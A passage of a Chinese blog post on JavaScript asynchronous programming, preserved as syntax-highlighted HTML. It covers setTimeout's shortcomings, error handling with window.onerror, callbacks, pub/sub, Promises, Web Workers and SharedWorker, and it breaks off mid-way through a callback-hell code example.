class="line"></span><br><span class="line">        <span class="comment">// 如果是数字，该数字作为延迟时间，延迟 dequeue</span></span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">             Q.<span class="title function_">d</span>();</span><br><span class="line">        &#125;, s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">record</span>(<span class="params">s</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> div = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&quot;div&quot;</span>);</span><br><span class="line">    div.<span class="property">innerHTML</span> = s;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(s);</span><br><span class="line">    <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(div);</span><br><span class="line">&#125;</span><br><span class="line">Q</span><br><span class="line">.<span class="title function_">q</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">record</span>(<span class="string">&quot;0 &lt;i&gt;3s 之后搞定，0 把 1 叫进来&lt;/i&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">q</span>(<span class="number">3000</span>)</span><br><span class="line">.<span class="title function_">q</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">record</span>(<span class="string">&quot;1 &lt;i&gt;2s 之后搞定，1 把 2 叫进来&lt;/i&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">q</span>(<span class="number">2000</span>)</span><br><span class="line">.<span class="title function_">q</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title function_">record</span>(<span class="string">&quot;2 &lt;span&gt;后面没人了，OK，厕所关门~&lt;/span&gt;&quot;</span>);</span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">d</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//事件队列管理，含延时</span></span><br></pre></td></tr></table></figure><p><span>&nbsp;</span></p><p>本文地址：<a href="http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html" target="_blank">http://www.cnblogs.com/hustskyking/p/javascript-asynchronous-programming.html</a>，转载请注明出处。</p><h3>一、Javascript 异步编程原理</h3><p>显然，上面这种方式和银行取号等待有些类似，只不过银行取号我们并不知道上一个人需要多久才会完成。这是一种非阻塞的方式处理问题。下面来探讨下 JavaScript 中的异步编程原理。</p><h4>1. setTimeout 函数的弊端</h4><p>延时处理当然少不了 setTimeout 这个神器，很多人对 setTimeout 函数的理解就是：延时为 n 的话，函数会在 n 毫秒之后执行。事实上并非如此，这里存在三个问题，一个是 setTimeout 函数的及时性问题，可以测试下面这串代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>, <span class="built_in">count</span> = <span class="number">0</span>, f, timer;</span><br><span class="line">timer = setInterval(f = <span class="keyword">function</span> (<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">Date</span> - d &gt; <span class="number">1000</span>)</span><br><span class="line">        clearInterval(timer), <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">count</span>);</span><br><span class="line">    <span class="built_in">count</span>++;</span><br><span class="line">&#125;, <span class="number">0</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看出 1s 中运行的次数大概在 200次 左右，有人会说那是因为 new Date 和 函数作用域的转换消耗了时间，其实不然，你可以再试试这段代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>, <span class="built_in">count</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">Date</span> - d &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">        <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="built_in">count</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">count</span>++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我这里显示的是 351813，也就是说 count 累加了 35W+ 次，这说明了什么呢？setInterval 和 setTimeout 函数运转的最短周期是 5ms 左右，这个数值在 <a href="http://www.whatwg.org/specs/web-apps/current-work/multipage/timers.html#dom-windowtimers-settimeout">HTML规范</a> 中也是有提到的:</p><figure class="highlight applescript"><table><tr><td class="code"><pre><span class="line"><span class="number">5.</span> Let <span class="keyword">timeout</span> be <span class="keyword">the</span> <span class="keyword">second</span> method argument, <span class="keyword">or</span> zero <span class="keyword">if</span> <span class="keyword">the</span> argument was omitted.</span><br><span class="line">如果 <span class="keyword">timeout</span> 参数没有写，默认为 <span class="number">0</span></span><br><span class="line"><span class="number">7.</span> If nesting level <span class="keyword">is</span> <span class="keyword">greater than</span> <span class="number">5</span>, <span class="keyword">and</span> <span class="keyword">timeout</span> <span class="keyword">is</span> <span class="keyword">less than</span> <span class="number">4</span>, <span class="keyword">then</span> increase <span class="keyword">timeout</span> <span class="keyword">to</span> <span class="number">4.</span></span><br><span class="line">如果嵌套的层次大于 <span class="number">5</span> ，并且 <span class="keyword">timeout</span> 设置的数值小于 <span class="number">4</span> 则直接取 <span class="number">4.</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>为了让函数可以更快速的相应，部分浏览器提供了更加高级的接口（当 timeout 为 0 的时候，可以使用下面的方式替代，速度更快）：</p><ul><li>requestAnimationFrame 它允许 JavaScript 以 60+帧/s 的速度处理动画，<span>他的运行时间间隔比 setTimeout 是要短很多的。</span> <span>@司徒正美</span>，他适合动画，使用他可以在 tab 失去焦点或者最小化的时候减缓运动，从而节省 CPU 资源，他的运行间隔确实比 setTimeout 要长。<span></span></li><li>process.nextTick 这个是 NodeJS 中的一个函数，利用他可以几乎达到上面看到的 while 循环的效率</li><li>ajax 或者 插入节点 的 readyState 变化</li><li>MutationObserver 大约 2-3ms</li><li>setImmediate &nbsp;</li><li>postMessage 这个相当快</li><li>...</li></ul><p>这些东西下次有空再细谈。之前研究<a href="http://www.cnblogs.com/rubylouvre" target="_blank">司徒正美</a>的 avalon 源码的时候，看到了相关的内容，有兴趣的可以看看：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//视浏览器情况采用最快的异步回调</span></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">BrowserMutationObserver</span> = <span class="variable language_">window</span>.<span class="property">MutationObserver</span> || <span class="variable language_">window</span>.<span class="property">WebKitMutationObserver</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title class_">BrowserMutationObserver</span>) &#123; <span class="comment">//chrome18+, safari6+, firefox14+,ie11+,opera15</span></span><br><span class="line">    avalon.<span class="property">nextTick</span> = <span class="keyword">function</span>(<span class="params">callback</span>) &#123; <span class="comment">//2-3ms</span></span><br><span class="line">        <span class="keyword">var</span> input = <span class="variable constant_">DOC</span>.<span class="title function_">createElement</span>(<span class="string">&quot;input&quot;</span>)</span><br><span class="line">        <span class="keyword">var</span> observer = <span class="keyword">new</span> <span class="title class_">BrowserMutationObserver</span>(<span class="keyword">function</span>(<span class="params">mutations</span>) &#123;</span><br><span class="line">            mutations.<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">                <span class="title function_">callback</span>()</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125;)</span><br><span class="line">        observer.<span class="title function_">observe</span>(input, &#123;</span><br><span class="line">            <span class="attr">attributes</span>: <span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">        input.<span class="title function_">setAttribute</span>(<span class="string">&quot;value&quot;</span>, <span class="title class_">Math</span>.<span class="title function_">random</span>())</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">VBArray</span>) &#123;</span><br><span class="line"><span class="comment">//IE下这个通常只要1ms,而且没有副作用，不会发现请求，</span></span><br><span class="line"><span class="comment">//setImmediate如果只执行一次，与setTimeout一样要140ms上下</span></span><br><span class="line">    avalon.<span class="property">nextTick</span> = <span class="keyword">function</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> node = <span class="variable constant_">DOC</span>.<span class="title function_">createElement</span>(<span class="string">&quot;script&quot;</span>)</span><br><span class="line">        node.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="title function_">callback</span>() <span class="comment">//在interactive阶段就触发</span></span><br><span class="line">            node.<span class="property">onreadystatechange</span> = <span class="literal">null</span></span><br><span class="line">            root.<span class="title function_">removeChild</span>(node)</span><br><span class="line">            node = <span class="literal">null</span></span><br><span class="line">        &#125;</span><br><span class="line">        root.<span class="title function_">appendChild</span>(node)</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    avalon.<span class="property">nextTick</span> = <span class="keyword">function</span>(<span class="params">callback</span>) &#123;</span><br><span class="line">        <span class="built_in">setTimeout</span>(callback, <span class="number">0</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面说了一堆，目的是想说明， setTimeout 是存在一定时间间隔的，并不是设定 n 毫秒执行，他就是 n 毫秒执行，可能会有一点时间的延迟（2ms左右）。然后说说他的第二个缺点，先看代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> d = <span class="keyword">new</span> <span class="built_in">Date</span>;</span><br><span class="line">setTimeout(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;show me after 1s, but you konw:&quot;</span> + (<span class="keyword">new</span> <span class="built_in">Date</span> - d));</span><br><span class="line">&#125;, <span class="number">1000</span>);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>) <span class="keyword">if</span>(<span class="keyword">new</span> <span class="built_in">Date</span> - d &gt; <span class="number">2000</span>) <span class="keyword">break</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们期望 console 在 1s 之后出结果，可事实上他却是在 2075ms 之后运行的，这就是 JavaScript 单线程给我们带来的烦恼，while循环阻塞了 setTimeout 函数的执行。接着是他的第三个毛病，try..catch捕捉不到他的错误：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;我不希望这个错误出现！&quot;</span>)</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span>(e)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="property">message</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以说 setTimeout 是异步编程不可缺少的角色，但是它本身就存在这么多的问题，这就要求我们用更加恰当的方式去规避！</p><h4>2. 什么样的函数为异步的</h4><p>异步的概念和非阻塞是是息息相关的，我们通过 ajax 请求数据的时候，一般采用的是异步的方式：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">xhr.open(<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.send();</span><br><span class="line">xhr.onreadystatechange = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(xhr.status);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在 xhr.open 中我们把第三个参数设置为 true ，也就是异步加载，当 state 发生改变的时候，xhr 立即响应，触发相关的函数。有人想过用这样的方式来处理：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">while(<span class="number">1</span>) &#123;</span><br><span class="line">    if(xhr.status <span class="operator">=</span><span class="operator">=</span><span class="operator">=</span> <span class="string">&quot;complete&quot;</span>) &#123;</span><br><span class="line">        // dosomething()<span class="comment">;</span></span><br><span class="line">        break<span class="comment">;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>而事实上，这里的判断已经陷入了死循环，即便是 xhr 的 status 已经发生了改变，这个死循环也跳不出来，那么这里的异步是基于事件的。</p><blockquote><p>某个函数会导致将来再运行的另一个函数，后者取自于事件队列（若后面这个函数是作为参数传递给前者的，则称其为回调函数，简称为回调）。<cite>&mdash;&mdash; 摘自《Async Javascript》</cite></p></blockquote><p>由于 JavaScript 的单线程特点，他没有提供一种机制以阻止函数在其异步操作结束之前返回，事实上，除非函数返回，否则不会触发任何异步事件。</p><h4>3. 常见的异步模型</h4><p>1） 最常见的一种方式是，高阶函数（泛函数）</p><figure class="highlight wren"><table><tr><td class="code"><pre><span class="line"><span class="title function_">step1</span>(<span class="params">function</span>(<span class="params">res1</span>)&#123;</span><br><span class="line">    <span class="title function_">step2</span>(<span class="params">function</span>(<span class="params">res2</span>)&#123;</span><br><span class="line">        <span class="title function_">step3</span>(<span class="params">function</span>(<span class="params">res3</span>)&#123;</span><br><span class="line">            <span class="comment">//...</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>解耦程度特别低，如果送入的参数太多会显得很乱！这是最常见的一种方式，把函数作为参数送入，然后回调。</p><p>2） 事件监听</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">E.<span class="title function_">on</span>(<span class="string">&quot;evt&quot;</span>, g);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        E.<span class="title function_">trigger</span>(<span class="string">&quot;evt&quot;</span>);</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>JS 和 浏览器提供的原生方法基本都是基于事件触发机制的，耦合度很低，不过事件不能得到流程控制。</p><p>3） 发布/订阅( Pub/Sub )</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">E.<span class="title function_">subscribe</span>(<span class="string">&quot;evt&quot;</span>, g);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">setTimeout</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">　　    <span class="comment">// f的任务代码</span></span><br><span class="line">　　    E.<span class="title function_">publish</span>(<span class="string">&quot;evt&quot;</span>);</span><br><span class="line">    &#125;, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>把事件全部交给 E 这个控制器管理，可以完全掌握事件被订阅的次数，以及订阅者的信息，管理起来特别方便。</p><p>4） Promise 对象（deferred 对象）</p><p>关于这里的内容可以看看 <a href="//www.imququ.com/post/promises-when-js.html" target="_blank">屈屈</a> 写的文章，说的比较详细。</p><p><a href="http://promisesaplus.com/" target="_blank">Promise/A+</a> 规范是对 <a href="http://wiki.commonjs.org/wiki/Promises/A" target="_blank">Promise/A</a> 规范的补充和修改，他出现的目的是为了统一异步编程中的接口，JS中的异步编程是十分普遍的事情，也出现了很多的异步库，如果不统一接口，对开发者来说也是一件十分痛苦的事情。</p><p>在Promises/A规范中，每个任务都有三种状态：默认(pending)、完成(fulfilled)、失败(rejected)。</p><ul><li>默认状态可以单向转移到完成状态，这个过程叫resolve，对应的方法是deferred.resolve(promiseOrValue)；</li><li>默认状态还可以单向转移到失败状态，这个过程叫reject，对应的方法是deferred.reject(reason)；</li><li>默认状态时，还可以通过deferred.notify(update)来宣告任务执行信息，如执行进度；</li><li>状态的转移是一次性的，一旦任务由初始的pending转为其他状态，就会进入到下一个任务的执行过程中。</li></ul><h3>二、异步函数中的错误处理</h3><p>前面已经提到了 setTimeout 函数的一些问题，JS 中的 try..catch 机制并不能拿到 setTimeout 函数中出现的错误，一个 throw error 的影响范围有多大呢？我做了一个测试：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;error&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;show me&quot;</span>); <span class="comment">// 并没有打印出来</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;show me&quot;</span>); <span class="comment">// 打印出来了</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从上面的测试我们可以看出，<code>throw new Error</code> 的作用范围就是阻断一个 script 标签内的程序运行，但是不会影响下面的 script。这个测试没什么作用，只是想告诉大家不要担心一个 Error 会影响全局的函数执行。所以把代码分为两段，一段可能出错的，一段确保不会出错的，这样不至于让全局代码都死掉，当然这样的处理方式是不可取的。</p><p>庆幸的是 window 全局对象上有一个便利的函数，<code>window.error</code>，我们可以利用他捕捉到所有的错误，并作出相应的处理，比如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">msg, url, line</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(msg, url, line);</span><br><span class="line">    <span class="comment">// 必须返回 true，否则 Error 还是会触发阻塞程序</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    <span class="comment">// console：</span></span><br><span class="line">    <span class="comment">//Uncaught Error: error path/to/ie6bug.html 99  </span></span><br><span class="line">&#125;, <span class="number">50</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以对错误进行封装处理：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">onerror</span> = <span class="keyword">function</span>(<span class="params">msg, url, line</span>)&#123;</span><br><span class="line">    <span class="comment">// 截断 &quot;Uncaught Error: error&quot;，获取错误类型</span></span><br><span class="line">    <span class="keyword">var</span> type = msg.<span class="title function_">slice</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">switch</span>(type)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;TooLarge&quot;</span>:</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The number is too large&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;TooSmall&quot;</span>:</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The number is too Small&quot;</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;TooUgly&quot;</span>:</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;That&#x27;s Barret Lee~&quot;</span>);</span><br><span class="line">        <span class="comment">// 如果不是我们预定义的错误类型，则反馈给后台监控</span></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            $ &amp;&amp; $.post &amp;&amp; $.<span class="title function_">post</span>(&#123;</span><br><span class="line">                <span class="string">&quot;msg&quot;</span>: msg,</span><br><span class="line">                <span class="string">&quot;url&quot;</span>: url,</span><br><span class="line">                <span class="string">&quot;line&quot;</span>: line</span><br><span class="line">            &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 记得这里要返回 true，否则错误阻断程序。</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>( something )  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;TooUgly&quot;</span>);</span><br><span class="line">    <span class="comment">// console：</span></span><br><span class="line">    <span class="comment">//That&#x27;s Barret Lee~ </span></span><br><span class="line">&#125;, <span class="number">50</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很显然，报错已经不可怕了，利用 window 提供的 onerror 函数可以很方便地处理错误并作出及时的反应，如果出现了不可知的错误，可以把信息 post 到后台，这也算是一个十分不错的监控方式。</p><p>不过这样的处理存在一个问题，所有的错误我们都给屏蔽了，但有些错误本应该阻断所有程序的运行的。比如我们通过 ajax 获取数据中出了错误，程序误以为已经拿到了数据，本应该停下工作报出这个致命的错误，但是这个错误被 window.onerror 给截获了，从而进行了错误的处理。</p><p>window.onerror 算是一种特别暴力的容错手段，try..catch 也是如此，他们底层的实现就是利用 C/C++ 中的 goto 语句实现，一旦发现错误，不管目前的堆栈有多深，不管代码运行到了何处，直接跑到 顶层 或者 try..catch 捕获的那一层，这种一脚踢开错误的处理方式并不是很好，我觉得。</p><h3>三、JavaScript 多线程技术介绍</h3><p>开始说了异步编程和非阻塞这个概念密切相关，而 JavaScript 中的 Worker 对象可以创建一个独立线程来处理数据，很自然的处理了阻塞问题。我们可以把繁重的计算任务交给 Worker 去倒腾，等他处理完了再把数据 Post 过来。</p><figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">var worker = <span class="keyword">new</span> <span class="constructor">Worker(<span class="string">&quot;./outer.js&quot;</span>)</span>;</span><br><span class="line">worker.add<span class="constructor">EventListener(<span class="string">&quot;message&quot;</span>, <span class="params">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    console.log(e.message);</span><br><span class="line">&#125;);</span><br><span class="line">worker.post<span class="constructor">Message(<span class="string">&quot;data one&quot;</span>)</span>;</span><br><span class="line">worker.post<span class="constructor">Message(<span class="string">&quot;data two&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// outer.js</span></span><br><span class="line">self.add<span class="constructor">EventListener(<span class="string">&quot;message&quot;</span>, <span class="params">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    self.post<span class="constructor">Message(<span class="params">e</span>.<span class="params">message</span>)</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面是一个简单的例子，如果我们创建了多个 Worker，在监听 onmessage 事件的时候还要判断下 e.target 的值从而得知数据源，当然，我们也可以把数据源封装在 e.message 中。</p><p>Worker 是一个有用的工具，我可以可以在 Worker 中使用 setTimeout，setInterval等函数，也可以拿到 navigator 的相关信息，最重要的是他可以创建 ajax 对象和 WebSocket 对象，也就是说他可以直接向服务器请求数据。不过他不能访问 DOM 的信息，更不能直接处理 DOM，这个其实很好理解，主线程和 Worker 是两个独立的线程，如果两者都可以修改 DOM，那岂不是得设置一个麻烦的互斥变量？！还有一个值得注意的点是，在 Worker 中我们可以使用 importScript 函数直接加载脚本，不过这个函数是同步的，也就是说他会冻结 Worker 线程，直到 Script 加载完毕。</p><figure class="highlight lisp"><table><tr><td class="code"><pre><span class="line">importScript(<span class="string">&quot;a.js&quot;</span>, <span class="string">&quot;b.js&quot;</span>, <span class="string">&quot;c.js&quot;</span>)<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>他可以添加多个参数，加载的顺序就是 参数的顺序。一般会使用 Worker 做哪些事情呢？</p><ul><li>数据的计算和加密 如计算斐波拉契函数的值，特别费时；再比如文件的 MD5 值比对，一个大文件的 MD5 值计算也是很费时的。</li><li>音、视频流的编解码工作，这些工作搞微信的技术人员应该没有少做。有兴趣的童鞋可以看看这个<a href="http://v.youku.com/v_show/id_XNjQ5NzgxODAw.html" target="_blank">技术分享</a>，是杭州的 hehe123 搞的一个WebRTC 分享，内容还不错。</li><li>等等，你觉得费时间的事情都可以交给他做</li></ul><p>然后要说的是 SharedWorker，这是 web 通信领域未来的一个趋势，有些人觉得 WebSocket 已经十分不错了，但是一些基于 WebSocket 的架构，服务器要为每一个页面维护一个 WebSocket 代码，而 SharedWorker 十分给力，他是多页面通用的。</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">&lt;input id<span class="operator">=</span><span class="string">&quot;inp&quot;</span>&gt;&lt;input type<span class="operator">=</span><span class="string">&quot;button&quot;</span> id<span class="operator">=</span><span class="string">&quot;btn&quot;</span> value<span class="operator">=</span><span class="string">&quot;发送&quot;</span>&gt;</span><br><span class="line">&lt;script type<span class="operator">=</span><span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">    var sw <span class="operator">=</span> new SharedWorder(<span class="string">&quot;./outer.js&quot;</span>)<span class="comment">;</span></span><br><span class="line">    // 绑定事件</span><br><span class="line">    sw.port.onmessage <span class="operator">=</span> function(e)&#123;</span><br><span class="line">        console.log(e.data)<span class="comment">;</span></span><br><span class="line">    &#125;<span class="comment">;</span></span><br><span class="line">    btn.onclick <span class="operator">=</span> function()&#123;</span><br><span class="line">        sw.port.postMessage(inp.value)<span class="comment">;</span></span><br><span class="line">        inp.value <span class="operator">=</span> <span class="string">&quot;&quot;</span><span class="comment">;</span></span><br><span class="line">    &#125;<span class="comment">;</span></span><br><span class="line">    // 创建连接，开始监听</span><br><span class="line">    sw.port.start()<span class="comment">;</span></span><br><span class="line">&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">// outer.js</span><br><span class="line">var pool <span class="operator">=</span> []<span class="comment">;</span></span><br><span class="line"><span class="attribute">onconnect</span> <span class="operator">=</span> function(e) &#123;</span><br><span class="line">    // 把连接的页面放入连接池</span><br><span class="line">    pool.push(e.ports[<span class="number">0</span>])<span class="comment">;</span></span><br><span class="line">    // 收到信息立即广播</span><br><span class="line">    e.ports[<span class="number">0</span>].onmessage <span class="operator">=</span> function(e)&#123;</span><br><span class="line">        for(var i <span class="operator">=</span> <span class="number">0</span><span class="comment">;i &lt; pool.length; i++)</span></span><br><span class="line">            // 广播信息</span><br><span class="line">            pool[i].postMessage(e.data)<span class="comment">;</span></span><br><span class="line">    &#125;<span class="comment">;</span></span><br><span class="line">&#125;<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>简单理解 SharedWorker，就是把运行的一个线程作为 web后台程序，完全不需要后台脚本参与，这个对 web通讯，尤其是游戏开发者，觉得是一个福音！</p><h3>四、ECMAScript 6 中 Generator 对象搞定异步</h3><p>异步两种常见方式是 事件监听 以及 函数回调。前者没什么好说的，事件机制是 JS 的核心，而函数回调这块，过于深入的嵌套简直就是一个地狱，可以看看<a href="http://callbackhell.com/" target="_blank">这篇文章</a>，这是一篇介绍异步编程的文章，什么叫做\回调地狱"，可以看看下面的例子：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line">fs.readdir(source, <span class="keyword">function</span>(<span class="params">err, files</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (err) &#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Error finding files: &#x27;</span> + err)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    files.forEach(<span class="keyword">function</span>(<span class="params">filename, fileIndex</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.<span class="built_in">log</span>(filename)</span><br><span class="line">      gm(source + filename).size(<span class="keyword">function</span>(<span class="params">err, values</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (err) &#123;</span><br><span class="line">          <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;Error identifying file size: &#x27;</span> + err)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="built_in">console</span>.<span class="built_in">log</span>(filename + <span class="string">&#x27; : &#x27;</span> + values)</span><br><span class="line">          aspect = (values.width / values.height)</span><br><span class="line">          widths.forEach(<span class="keyword">function</span>(<span class="params">width, widthIndex</span>) &#123;</span><br><span class="line">            height = Math.<span class="built_in">round</span>(width / aspect)</span><br><span class="line">            <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&#x27;resizing &#x27;</span> + filename + <span class="string">&#x27;to &#x27;</span> + height + <span class="string">&#x27;x&#x27;</span> + height)</span><br><span class="line">            this.<span class="built_in">resize</span>(width, height).write(destination + <span class="string">&#x27;w&#x27;</span> + width + <span class="string">&#x27;_&#x27;</span> + filename, <span class="keyword">function</span>(<span class="params">err</span>) 